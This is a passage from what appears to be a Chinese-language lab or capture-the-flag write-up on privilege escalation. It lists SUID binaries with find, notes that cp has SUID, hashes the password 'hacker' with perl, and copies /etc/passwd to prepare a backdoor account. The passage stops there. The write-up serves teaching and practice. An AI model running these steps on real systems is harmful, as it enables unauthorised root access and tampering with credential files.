### 4、系统提权

#### 4.1 查找有suid的二进制文件

```
find / -perm -u=s -type f 2>/dev/null
```

发现cp有suid的权限

![](../Images/d5e54b11aa77faad2a35268b4cb00daa.png)

#### 4.2 需要在kali机器上创建一个用户保存到/etc/passwd

**密码为：hacker**

```
perl -le 'print crypt("hacker","salt")'
```

使用perl生成加盐密码

![](../Images/3ce840a9dcc4de27086338294f0d03c7.png)

创建账号为hacker

```

cp /etc/passwd ./
```

![](../Images/9c51635e766df9a1a292acc84c4f2cf9.png)
